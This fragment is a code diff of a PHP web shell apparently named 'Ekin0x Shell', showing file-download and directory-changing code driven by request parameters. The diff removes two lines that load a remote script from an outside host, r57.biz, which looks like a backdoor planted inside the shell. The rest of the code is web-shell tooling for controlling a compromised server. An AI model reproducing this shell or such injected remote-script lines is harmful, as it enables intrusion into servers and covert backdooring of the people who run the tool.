@@ -47,7 +47,6 @@ function download($dwfile) {$size = filesize($dwfile);
 @header("Pragma: no-cache");
 @readfile($dwfile); exit;}
 ?>
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 <html> 
 <head><title>Ekin0x Shell</title></head>
 <style> 
@@ -63,7 +62,6 @@ select{background-color: #191919; font-size: 12px; color: #dadada; font-family: 
 </html> 
 <?
 $nscdir =(!isset($_REQUEST['scdir']))?getcwd():chdir($_REQUEST['scdir']);$nscdir=getcwd();
-<SCRIPT SRC=http://r57.biz/yazciz/ciz.js></SCRIPT>
 $sf="<form method=post>";$ef="</form>";
 $st="<table style=\"border:1px #dadada solid \" width=100% height=100%>";
 $et="</table>";$c1="<tr><td height=22% style=\"border:1px #dadada solid \">";
